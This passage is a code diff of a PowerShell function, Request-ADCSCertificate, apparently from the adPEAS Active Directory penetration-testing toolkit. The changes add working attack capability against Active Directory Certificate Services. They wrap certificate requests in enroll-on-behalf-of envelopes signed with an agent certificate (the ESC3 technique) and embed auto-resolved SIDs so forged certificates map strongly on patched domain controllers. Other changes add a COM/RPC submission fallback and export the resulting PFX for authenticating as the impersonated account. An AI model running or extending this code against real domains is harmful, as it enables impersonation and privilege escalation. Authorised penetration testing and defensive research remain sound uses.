+                $dnsSan = $resolvedSANs | Where-Object { $_ -match '^DNS:' } | Select-Object -First 1
+                if ($OnBehalfOf) {
+                    $sidTargetIdentity = $OnBehalfOf
+                }
+                elseif ($upnSan) {
+                    $sidTargetIdentity = ($upnSan -split ':', 2)[1]
+                }
+                elseif ($dnsSan) {
+                    # Computer account: sAMAccountName is "<hostname>$"
+                    $dnsValue = ($dnsSan -split ':', 2)[1]
+                    $sidTargetIdentity = "$(($dnsValue -split '\.')[0])`$"
+                }
+                elseif ($resolvedSubjectDN -match 'CN=([^,]+)') {
+                    $sidTargetIdentity = $Matches[1].Trim()
+                }
+
+                if ($sidTargetIdentity -and $Script:LdapConnection) {
+                    Write-Log "$FunctionPrefix Attempting SID auto-resolution for '$sidTargetIdentity'"
+                    try {
+                        $resolvedSID = ConvertTo-SID -Identity $sidTargetIdentity
+                    }
+                    catch {
+                        Write-Log "$FunctionPrefix SID auto-resolution threw: $_"
+                    }
+                    if ($resolvedSID) {
+                        Show-Line "Auto-resolved SID for '$sidTargetIdentity': $resolvedSID (embedding NTDS CA Security Extension for strong mapping)" -Class Hint
+                    }
+                    else {
+                        Show-Line "Could not resolve a SID for '$sidTargetIdentity'. On patched DCs the certificate may not map - supply -SID explicitly, or use -NoSID to silence this." -Class Hint
+                    }
+                }
+                elseif (-not $Script:LdapConnection) {
+                    Write-Log "$FunctionPrefix No LDAP session for SID auto-resolution; supply -SID for strong mapping"
+                }
+            }
+
             # === Step 3: Generate CSR ===
             $csrResult = $null
             try {
@@ -1430,6 +2486,12 @@ function Request-ADCSCertificate {
                 }
                 if ($resolvedSANs.Count -gt 0) {
                     $csrParams['AlternativeNames'] = $resolvedSANs
+                }
+                if ($resolvedSID) {
+                    $csrParams['SID'] = $resolvedSID
+                }
+                if ($ApplicationPolicies -and $ApplicationPolicies.Count -gt 0) {
+                    $csrParams['ApplicationPolicies'] = $ApplicationPolicies
                 }
                 $csrResult = New-PKCS10Request @csrParams
             }
@@ -1442,73 +2504,102 @@ function Request-ADCSCertificate {
 
             $rsa = $csrResult.RSAKey
             try {
-                # === Step 4: Submit CSR to CA (HTTPS/HTTP first, COM fallback) ===
-                $submitResult = Submit-CertsrvRequest -CAServer $CAServer `
-                    -CSRBase64 $csrResult.CSRBase64 `
-                    -TemplateName $TemplateName `
-                    -Credential $Credential `
-                    -UseHTTP:$resolvedUseHTTP
-
-                # If HTTP/HTTPS failed with network/connection error, try COM/RPC fallback
-                if ($submitResult.Status -eq 'Error' -and
-                    ($submitResult.ErrorMessage -match 'unable to connect|connection|timeout|refused|unreachable' -or
-                     $submitResult.RawResponse -match 'HTTP.*40[13]')) {
-
-                    Show-Line "Web Enrollment unavailable, attempting COM/RPC fallback..." -Class Hint
-                    Write-Log "$FunctionPrefix Web Enrollment failed: $($submitResult.ErrorMessage), trying COM/RPC"
-
-                    # Need CA name for COM interface (format: CAServer\CAName)
-                    # Extract from candidateCAs if available
-                    $caName = $null
-                    if ($candidateCAs -and $candidateCAs.Count -gt 0) {
-                        $matchingCA = $candidateCAs | Where-Object { $_.DNSHostName -eq $CAServer } | Select-Object -First 1
-                        if ($matchingCA) {
-                            $caName = $matchingCA.Name
-                        }
-                    }
-
-                    if (-not $caName) {
-                        Write-Warning "[!] Cannot determine CA name for COM/RPC fallback. Web Enrollment error: $($submitResult.ErrorMessage)"
+                # === Step 3b: Wrap into a PKCS#7 enroll-on-behalf-of envelope (ESC3) ===
+                # The submission payload is the bare CSR unless on-behalf-of, in which
+                # case it is a SignedData envelope signed by the agent certificate.
+                $submissionBase64 = $csrResult.CSRBase64
+                $submissionIsPKCS7 = $false
+                if ($OnBehalfOf) {
+                    Show-Line "Wrapping request as enroll-on-behalf-of '$OnBehalfOf' (signed by agent certificate)" -Class Note
+                    $p7Base64 = New-EnrollOnBehalfOfRequest -InnerCsrDer $csrResult.CSRBytes `
+                        -OnBehalfOf $OnBehalfOf -AgentCert $oboAgentCert
+                    if (-not $p7Base64) {
+                        Write-Warning "[!] Failed to build the on-behalf-of request."
                         return $null
                     }
+                    $submissionBase64 = $p7Base64
+                    $submissionIsPKCS7 = $true
+                }
 
-                    # Try COM/RPC submission
+                # === Step 4: Submit CSR to CA via the selected transport ===
+                $submitResult = $null
+
+                if ($resolvedMethod -eq 'COM') {
+                    # COM/RPC was selected directly (web absent or -Method COM)
+                    Write-Log "$FunctionPrefix Submitting via COM/RPC to CA '$resolvedCAName'"
                     $comResult = Submit-COMRequest -CAServer $CAServer `
-                        -CAName $caName `
-                        -CSRBase64 $csrResult.CSRBase64 `
-                        -TemplateName $TemplateName
+                        -CAName $resolvedCAName `
+                        -CSRBase64 $submissionBase64 `
+                        -TemplateName $TemplateName `
+                        -Credential $Credential `
+                        -IsPKCS7:$submissionIsPKCS7
 
                     if ($comResult.Success) {
-                        # Convert COM result to certsrv result format for consistency
                         $submitResult = @{
                             Success      = $true
                             Status       = 'Issued'
                             RequestID    = $comResult.RequestID
-                            Certificate  = $comResult.Certificate  # COM returns cert immediately
+                            Certificate  = $comResult.Certificate   # X509Certificate2
                             ErrorMessage = $null
+                            RawResponse  = $null
                         }
                         Show-Line "Certificate issued via COM/RPC (Request ID: $($comResult.RequestID))" -Class Hint
                     }
                     else {
-                        Write-Warning "[!] Both Web Enrollment and COM/RPC failed"
-                        Write-Warning "[!] Web Enrollment: $($submitResult.ErrorMessage)"
-                        Write-Warning "[!] COM/RPC: $($comResult.ErrorMessage)"
+                        Write-Warning "[!] COM/RPC request failed: $($comResult.ErrorMessage)"
                         return $null
                     }
                 }
                 else {
-                    # Handle other error types (Auth, Denied, etc.) - no COM fallback
-                    if ($submitResult.Status -eq 'AuthError') {
-                        Write-Warning "[!] $($submitResult.ErrorMessage)"
-                        return $null
-                    }
+                    # Web enrollment (certsrv)
+                    Write-Log "$FunctionPrefix Submitting via Web Enrollment (http=$resolvedUseHTTP)"
+                    $submitResult = Submit-CertsrvRequest -CAServer $CAServer `
+                        -CSRBase64 $submissionBase64 `
+                        -TemplateName $TemplateName `
+                        -Credential $Credential `
+                        -UseHTTP:$resolvedUseHTTP `
+                        -Port $Port
 
-                    if ($submitResult.Status -eq 'Denied') {
-                        Write-Warning "[!] $($submitResult.ErrorMessage)"
-                        return $null
-                    }
+                    # Only a genuine TRANSPORT failure triggers the COM/RPC fallback.
+                    # Auth/Denied responses are real CA answers, not transport problems,
+                    # so they must NOT silently retry over COM.
+                    $isTransportFailure = ($submitResult.Status -eq 'Error' -and
+                        $submitResult.ErrorMessage -match 'connect|connection|timeout|refused|unreachable')
 
-                    if ($submitResult.Status -eq 'Error') {
+                    if ($isTransportFailure -and $comEligible -and $resolvedCAName) {
+                        Show-Line "Web Enrollment transport error ($($submitResult.ErrorMessage)), attempting COM/RPC fallback..." -Class Hint
+                        Write-Log "$FunctionPrefix Web Enrollment transport failure, trying COM/RPC with CA '$resolvedCAName'"
+
+                        $comResult = Submit-COMRequest -CAServer $CAServer `
+                            -CAName $resolvedCAName `
+                            -CSRBase64 $submissionBase64 `
+                            -TemplateName $TemplateName `
+                            -Credential $Credential `
+                            -IsPKCS7:$submissionIsPKCS7
+
+                        if ($comResult.Success) {
+                            $submitResult = @{
+                                Success      = $true
+                                Status       = 'Issued'
+                                RequestID    = $comResult.RequestID
+                                Certificate  = $comResult.Certificate   # X509Certificate2
+                                ErrorMessage = $null
+                                RawResponse  = $null
+                            }
+                            Show-Line "Certificate issued via COM/RPC fallback (Request ID: $($comResult.RequestID))" -Class Hint
+                        }
+                        else {
+                            Write-Warning "[!] Both Web Enrollment and COM/RPC failed"
+                            Write-Warning "[!] Web Enrollment: $($submitResult.ErrorMessage)"
+                            Write-Warning "[!] COM/RPC: $($comResult.ErrorMessage)"
+                            return $null
+                        }
+                    }
+                    elseif ($submitResult.Status -in @('AuthError', 'Denied', 'Error')) {
+                        # Non-recoverable web result (no fallback eligible/possible)
+                        if ($isTransportFailure -and -not $resolvedCAName) {
+                            Write-Log "$FunctionPrefix Transport failure but no CA name known for COM/RPC fallback (use -CAName)"
+                        }
                         Write-Warning "[!] $($submitResult.ErrorMessage)"
                         return $null
                     }
@@ -1517,12 +2608,34 @@ function Request-ADCSCertificate {
                 if ($submitResult.Status -eq 'Pending') {
                     Show-Line "Certificate request is pending approval (Request ID: $($submitResult.RequestID))" -Class Hint
                     Show-Line "The CA administrator must approve this request before the certificate can be retrieved."
+
+                    # Persist the private key so the certificate can be paired into a
+                    # PFX after approval via -RetrieveID. Without this the key is lost
+                    # when this call returns and the issued certificate is unusable.
+                    $savedKeyPath = $null
+                    try {
+                        $cnForKey = if ($resolvedSubjectDN -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
+                        $savedKeyPath = Save-PendingPrivateKey -RSA $rsa -RequestID $submitResult.RequestID `
+                            -Subject $resolvedSubjectDN -CAServer $CAServer `
+                            -OutputPath "${cnForKey}_req$($submitResult.RequestID).key.json" -Force:$Force
+                    }
+                    catch {
+                        Write-Warning "[!] Could not save the private key for later retrieval: $_"
+                    }
+
+                    if ($savedKeyPath) {
+                        Show-Line "Private key saved for retrieval: $savedKeyPath" -Class Hint
+                        Show-Line "After approval, retrieve with:" -Class Note
+                        Show-Line "Request-ADCSCertificate -RetrieveID $($submitResult.RequestID) -CAServer '$CAServer' -KeyFile '$savedKeyPath'"
+                    }
+
                     if ($PassThru) {
                         return [PSCustomObject]@{
                             Success   = $true
                             Status    = 'Pending'
                             RequestID = $submitResult.RequestID
                             CAServer  = $CAServer
+                            KeyFile   = $savedKeyPath
                             Message   = "Certificate pending approval. Request ID: $($submitResult.RequestID)"
                         }
                     }
@@ -1548,7 +2661,8 @@ function Request-ADCSCertificate {
                     $issuedCert = Get-CertsrvCertificate -CAServer $CAServer `
                         -RequestID $submitResult.RequestID `
                         -Credential $Credential `
-                        -UseHTTP:$resolvedUseHTTP
+                        -UseHTTP:$resolvedUseHTTP `
+                        -Port $Port
 
                     if (-not $issuedCert) {
                         Write-Warning "[!] Failed to retrieve issued certificate"
@@ -1556,97 +2670,16 @@ function Request-ADCSCertificate {
                     }
                 }
 
-                # === Step 6: Build PFX (private key + issued certificate) ===
-                if ($NoPassword) {
-                    $pfxPassword = $null
-                }
-                else {
-                    $pfxPassword = New-SafePassword -Length 20
-                }
-
-                try {
-                    # Use CopyWithPrivateKey to combine CA-issued cert with our private key
-                    $certWithKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($issuedCert, $rsa)
-                    if ($pfxPassword) {
-                        $securePfxPassword = ConvertTo-SecureString -String $pfxPassword -AsPlainText -Force
-                        $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $securePfxPassword)
-                    }
-                    else {
-                        $pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx)
-                    }
-                    $certWithKey.Dispose()
-                }
-                catch {
-                    Write-Log "$FunctionPrefix CopyWithPrivateKey failed: $_"
-                    Write-Warning "[!] Failed to create PFX. .NET Framework 4.7.2+ is required."
+                # === Steps 6-8: Build PFX, save, display, return ===
+                $pfxResult = Save-IssuedCertificatePFX -IssuedCert $issuedCert -RSA $rsa `
+                    -OutputPath $OutputPath -NoPassword:$NoPassword `
+                    -TemplateName $TemplateName -RequestID $submitResult.RequestID -CAServer $CAServer `
+                    -Force:$Force
+                if (-not $pfxResult) {
                     return $null
                 }
-
-                # === Step 7: Save PFX ===
-                if (-not $OutputPath) {
-                    # Extract CN from the ISSUED certificate (CA may override the requested subject)
-                    $cnForFile = if ($issuedCert.Subject -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
-                    $pfxTimestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-                    $OutputPath = "${cnForFile}_${pfxTimestamp}.pfx"
-                }
-
-                $exportResult = Export-adPEASFile -Path $OutputPath -Content $pfxBytes -Type Binary -SanitizeFilename -Force:$Force
-                if (-not $exportResult.Success) {
-                    Write-Warning "[!] Failed to save PFX: $($exportResult.Message)"
-                    return $null
-                }
-                $OutputPath = $exportResult.Path
-
-                # === Step 8: Display Results ===
-                Show-Line "Certificate saved as PFX:" -Class Hint
-                Show-KeyValue "PFX Path:" $OutputPath
-                if ($pfxPassword) {
-                    Show-KeyValue "PFX Password:" $pfxPassword
-                } else {
-                    Show-KeyValue "PFX Password:" "(none)" -Class Note
-                }
-                Show-KeyValue "Thumbprint:" $issuedCert.Thumbprint
-                Show-KeyValue "Subject:" $issuedCert.Subject
-                Show-KeyValue "Issuer:" $issuedCert.Issuer
-                Show-KeyValue "Valid Until:" $issuedCert.NotAfter.ToString("yyyy-MM-dd")
-                Show-KeyValue "Template:" $TemplateName
-
-                # Show SANs from issued certificate
-                $sanExt = $issuedCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
-                if ($sanExt) {
-                    Show-KeyValue "SAN:" $sanExt.Format($false)
-                }
-
-                Show-EmptyLine
-
-                # Show usage hints
-                $domainHint = if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) { $Script:LDAPContext['Domain'] } else { '<domain>' }
-                Show-Line "Usage with Connect-adPEAS:" -Class Note
-                if ($pfxPassword) {
-                    Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath' -CertificatePassword '$pfxPassword'"
-                } else {
-                    Show-Line "Connect-adPEAS -Domain $domainHint -Certificate '$OutputPath'"
-                }
-
-                # Save certificate properties before disposing
-                $certThumbprint = $issuedCert.Thumbprint
-                $certSubject = $issuedCert.Subject
-                $certIssuer = $issuedCert.Issuer
-                $issuedCert.Dispose()
-
                 if ($PassThru) {
-                    return [PSCustomObject]@{
-                        Success     = $true
-                        Status      = 'Issued'
-                        RequestID   = $submitResult.RequestID
-                        PFXPath     = $OutputPath
-                        PFXPassword = if ($pfxPassword) { $pfxPassword } else { $null }
-                        Thumbprint  = $certThumbprint
-                        Subject     = $certSubject
-                        Issuer      = $certIssuer
-                        Template    = $TemplateName
-                        CAServer    = $CAServer
-                    }
+                    return $pfxResult
                 }
             }
             finally {
